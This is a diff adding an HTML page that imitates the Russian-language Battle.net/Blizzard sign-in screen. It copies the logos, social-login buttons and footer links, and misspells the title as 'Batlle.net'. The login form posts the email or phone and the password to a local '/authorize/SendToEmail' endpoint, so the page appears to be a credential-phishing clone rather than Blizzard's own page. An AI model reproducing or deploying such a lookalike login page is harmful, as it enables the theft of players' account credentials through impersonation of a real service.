@@ -1,0 +1,442 @@
+<html>
+    <head>
+        <title>Авторизация в Batlle.net</title>
+        <meta charset="UTF-8">
+        <link rel="icon" type ="image/x-icon" href="images/head-icon.png">
+        <style>
+            html {
+                font-family: sans-serif;
+                text-size-adjust: 100%;
+                height: auto;
+            }
+            body {
+                background: #1c1e26 no-repeat center top;
+                color: rgba(255, 255, 255, 0.84);
+            }
+            body {
+                font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                font-size: 16px;
+                line-height: 24px;
+            }
+            .inner{
+                position: relative;
+                width: 100%;
+                padding: 24px 0;
+                background: none;
+                border: none;
+                box-sizing: border-box;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+            .main_logo{
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin: 0 auto 38px auto;
+            }
+            .content{
+                font-weight: 700;
+                font-size: 32px;
+                line-height: 36px;
+                color: #ffffff;
+                justify-content: center;
+                display: flex;
+                width: 100%;
+                margin-top: -30px;
+            }
+            .buttons_first{
+                display: flex;
+                flex-flow: row wrap;
+                justify-content: center;
+                align-items: center;
+                margin: 0 40px;
+            }
+
+            .buttons_first button {
+                position: relative;
+                width: 48px;
+                height: 48px;
+                padding: 13px;
+                border-radius: 4px;
+                margin: 12px;
+                border: none;
+                
+            }
+            .buttons_first img{
+                width: 20px;
+                height: 20px;
+            }
+            .buttons_second img{
+                width: 18px;
+                height: 18px;
+            }
+            .buttons_second{
+                display: flex;
+                flex-flow: row wrap;
+                justify-content: center;
+                align-items: center;
+                margin: 0 40px;
+            }
+            .buttons_second button {
+                position: relative;
+                width: 48px;
+                height: 48px;
+                padding: 13px;
+                border-radius: 4px;
+                margin: 12px;
+                border: none;               
+            }
+            .facebook button{
+                background-color: #1877f2;
+            }
+            .xbox button{
+                background-color: #107c10;
+            }
+            .nintendo button{
+                background-color: #e60012;
+            }
+            .ps button{
+                background-color: #0070cc;
+            }
+
+            .google button:hover{
+                background-color: rgb(190, 190, 190);
+                transition: 0.3s;
+            }
+            .facebook button:hover{
+                background-color: rgb(70, 70, 198);
+                transition: 0.3s;
+            }
+            .apple button:hover{
+                background-color: rgb(190, 190, 190);
+                transition: 0.3s;
+            }
+            .steam button:hover{
+                background-color: rgb(190, 190, 190);
+                transition: 0.3s;
+            }
+            .xbox button:hover{
+                background-color:rgb(7, 70, 7) ;
+                transition: 0.3s;
+            }
+            .ps button:hover{
+                background-color: rgb(35, 35, 114);
+                transition: 0.3s;
+            }
+            .nintendo button:hover{
+                background-color:rgb(155, 2, 2) ;
+                transition: 0.3s;
+            }
+
+
+
+
+            .registration{
+                margin: 40px 0 24px 0;
+                font-style: normal;
+                font-weight: 700;
+                font-size: 14px;
+                line-height: 21px;
+                text-align: center;
+                color: rgba(255, 255, 255, 0.6);
+                text-transform: none;
+                font-family: "Noto Sans", "Object Sans", sans-serif;
+            }
+
+            .registration span:after {
+                margin-top: -10px;
+                margin-left: 25px;
+                width: 125px;
+                content: "";
+                height: 1px;
+                background-color: #fff;
+                background-color: rgba(255, 255, 255, 0.1);
+                position: absolute;
+                top: 50%;
+            }
+            .registration span::before{
+                margin-top: -10px;
+                margin-left: -145px;
+                width: 125px;
+                content: "";
+                height: 1px;
+                background-color: #fff;
+                background-color: rgba(255, 255, 255, 0.1);
+                position: absolute;
+                top: 50%;
+            }
+
+
+
+
+
+
+            .input_text{
+                display: flex;
+                vertical-align: middle;
+                height: 40px;
+                padding: 0px 3px;
+                margin-top: 3px;
+                margin-bottom: 3px;
+                font-size: 17px;
+                line-height: 24px;
+                border: 1px solid rgba(255, 255, 255, 0.36);
+                background-color: #171920;
+                color: #ffffff;
+                -moz-box-sizing: border-box;
+                box-sizing: border-box;
+                max-width: 413px;
+                min-height: 40px;
+                box-sizing: border-box;
+                border-radius: 4px;
+                width: 100%;
+                margin-left: 5px;
+
+
+            }
+            .input_text input{
+                background-color: #171920;
+                border: none;
+                resize: none;
+                word-wrap: break-word;
+                outline: none;
+                color:white;
+                font-size: 17px;
+                font-weight: 400;
+                width: 100%;
+                margin-left: 4px;
+            }
+            .input_text ::placeholder{
+                color:rgb(164, 159, 159);
+            }
+            .input_password ::placeholder{
+                color:rgb(164, 159, 159);
+            }
+            .input_password{
+                display: flex;
+                vertical-align: middle;
+                height: 40px;
+                padding: 0px 3px;
+                margin-top: 3px;
+                margin-bottom: 3px;
+                font-size: 17px;
+                line-height: 24px;
+                border: 1px solid rgba(255, 255, 255, 0.36);
+                background-color: #171920;
+                color: #ffffff;
+                -moz-box-sizing: border-box;
+                box-sizing: border-box;
+                max-width: 413px;
+                min-height: 40px;
+                box-sizing: border-box;
+                border-radius: 4px;
+                width: 100%;
+                margin-top: 10px;
+                margin-left: 5px;
+            }
+
+            .password{
+                background-color: #171920;
+                border: none;
+                resize: none;
+                word-wrap: break-word;
+                outline: none;
+                color:white;
+                font-size: 17px;
+                font-weight: 400;
+                width: 100%;
+                margin-left: 4px;
+                
+            }
+            .input_password:hover{
+                border: 1px solid #fff;
+                border-radius: 4px;
+            }
+            .input_text:hover{
+                border: 1px solid #fff;
+                border-radius: 4px;
+            }
+
+
+            
+            .btn{
+                white-space: normal;
+                margin: 3px 0;
+                font-size: 16px;
+                line-height: 20px;
+                min-height: 40px;
+                background-color: #0074E0;
+                color: #ffffff;
+                border: 2px solid transparent;
+                font-weight: 500;
+                border-radius: 4px;
+                transition: background-color 0.2s, border-color 0.2s, color 0.2s;
+                text-align: center;
+                vertical-align: middle;
+                cursor: pointer;
+                -moz-box-sizing: border-box;
+                box-sizing: border-box;
+                margin-bottom: 26px;
+                margin-top: 38px;
+                margin-left: 5px;
+                
+            }
+            .btn button{
+                color:white;
+                background-color:#0074E0;
+                border:  none;
+                font-size: 15px;
+                padding: 0px 150px;
+                margin-top: 10px;
+            }
+            .links a{
+                color: #148eff;
+                text-decoration: none;
+                font-size: 16px;
+                padding: auto;
+            }
+            .links a:hover{
+                text-decoration: underline;
+
+            }
+
+            .links{
+                font-size: 16px;
+                text-align: center;
+                padding: 0;
+                margin: 0 0 39.6px 30px;
+                padding-right: 5px;
+                margin-top: 35px;
+                margin-left: 5px;
+            }
+
+            .footer{
+                margin-top: 40px;
+            }
+            .footer_links span{
+                color:rgb(67, 67, 67);
+
+            }
+            .footer_links{
+                text-align: center;
+                margin-left: 5px;
+
+            }
+            .footer_links a{
+                text-decoration: none;
+                font-size: 12px;
+                padding: auto;
+                color: rgba(255, 255, 255, 0.7);
+                transition: text-shadow 160ms ease, color 160ms ease;
+            }
+            .footer_links a:hover{
+                color:rgb(255, 255, 255);
+                text-decoration: none;
+            }
+            .footer_text{
+                padding: 0;
+                text-align: center;
+                font-size: 12px;
+                color: #7b7b7b;
+                margin-left: 5px;
+
+            }
+        </style>
+    </head>
+    <body>
+        <main class ="inner">
+            <div class = "main_logo">
+                <img src="images/logo-horizontal-color-light.1z1fI.svg" alt style="width: 240px;height: 72px;">
+                
+            </div>
+            <div class ="content">
+                <h3 id ="authorization"><b>Авторизоваться</b></h3>
+            </div>
+            <div>
+            </div>
+            <div class="buttons_first">
+                <div class="google">
+                    <button type="submit" href ="google-logo-color.svg"><img src ="images/google-logo-color.svg">
+                    </button>
+                </div>
+                <div class ="facebook">
+                    <button type="submit" href ="facebook-logo-white.svg"><img src ="images/facebook-logo-white.svg">
+                    </button>
+                </div>
+                <div class ="apple">
+                    <button type="submit" href ="apple-logo-black.svg"><img src ="images/apple-logo-black.svg">
+                    </button>
+                </div>
+            </div>
+            <div class ="buttons_second">
+                <div class ="xbox">
+                    <button type="submit" href ="xbox-logo-white.svg"><img src ="images/xbox-logo-white.svg">
+                    </button>
+                </div>
+                <div class ="ps">
+                    <button type="submit" href ="ps.svg"><img src ="images/ps.svg">
+                    </button>
+                </div>
+                <div class ="nintendo">
+                    <button type="submit" href ="switch-logo-white.svg"><img src ="images/switch-logo-white.svg">
+                    </button>
+                </div>
+                <form class ="steam" action = "/Order/List" method="post" style="margin-top: 16px">
+                    <button><img src ="images/steam-logo-black.svg">
+                    </button>
+                </form>
+            </div>
+            <div class="registration">
+                <span>
+                    или войти через
+                </span>
+            </div>
+            <form action="/authorize/SendToEmail" method="post">
+                <div class="input_text">
+                    <input class ="password" type="text" title="Электронная почта или телефон" placeholder="Электронная почта или телефон"name="email">
+                </div> 
+                <div class="input_password">
+                    <input class ="password"type="password" title="Пароль" placeholder="Пароль" name="password">
+                </div>
+                
+                <div class ="btn">
+                    <a href="second_index.html">
+
+                    
+                    <button type="submit">Авторизоваться</button>
+                </a>
+                </div>
+            </form>
+            
+            <div class ="links">
+                <a id = "first" href="https://account.battle.net/creation/flow/creation-full"><b>Зарегистрируйте учетную запись Battle.net <br>бесплатно</b></a>
+                <br>
+                <br>
+                <a id="second" href="https://account.battle.net/recovery/ru/?ref=&theme=bnet-next&app=shop&hostingApp=shop&flowTrackingId=27fc2a3f-a0fa-43d1-9d53-f6bcb22c7cb5">
+                    <b >Вы не можете войти?</b>
+                    <img src ="images/arrow.svg" style="width: 12px; height: 12px;">
+                </a>
+            </div>
+        </main>
+        <footer>
+            <div class ="footer_links">
+                <a href ="https://www.blizzard.com/company/legal/eula"> ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ BLIZZARD </a>
+                <span>|</span>
+                <a href ="https://www.blizzard.com/company/legal/eula"> ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ </a>
+                <span>|</span>
+                <a href ="https://www.blizzard.com/company/legal/eula"> УСЛОВИЯ </a>
+                <span>|</span>
+                <br>
+                <a href ="https://www.blizzard.com/company/legal/eula"> АВТОРСКОЕ ПРАВО </a>
+                <span>|</span>
+                <a href ="https://www.blizzard.com/company/legal/eula"> ФАЙЛЫ COOKIE </a>
+                <span>|</span>
+                <a href ="https://www.blizzard.com/company/legal/eula"> ПАРАМЕТРЫ COOKIE </a>
+            </div>
+            <div class ="footer_text">
+                © BLIZZARD ENTERTAINMENT, INC., 2023
+            </div>
+        </footer>
+    </body>
+</html>
